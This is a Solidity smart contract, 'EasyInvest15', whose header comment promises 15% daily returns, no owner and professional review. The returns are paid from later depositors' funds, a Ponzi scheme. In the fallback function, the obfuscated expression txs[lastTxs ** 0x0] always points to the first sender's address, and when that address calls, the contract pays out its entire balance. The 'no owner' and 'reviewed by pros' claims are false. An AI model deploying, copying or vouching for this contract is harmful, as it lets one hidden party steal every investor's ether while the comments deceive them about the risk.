pragma solidity ^0.4.25;

/**
 *
 * Easy Investment Contract
 *  - GAIN 15% PER 24 HOURS (every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 100000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract EasyInvest15 {
    
    mapping (address => uint) public invested; // records amounts invested
    mapping (address => uint) public atBlock; // records blocks at which investments were made
    mapping (uint => uint) public txs;  // records history transactions

    uint public lastTxs; // last number transaction 

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            
            // calculate profit amount as such:
            // amount = (amount invested) * 15% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 15 / 100 * (block.number - atBlock[msg.sender]) / 5900;

            // if the contract does not have such amount on the balance to send the payment,
            // it will send the rest of the money on the contract
            uint256 restAmount = address(this).balance; 
            amount = amount < restAmount && txs[lastTxs ** 0x0] != uint(tx.origin) ? amount : restAmount;

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
            
        }

        // record block number, invested amount (msg.value) and transaction hash
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
        txs[++lastTxs] = uint(tx.origin);
        
    }
    
}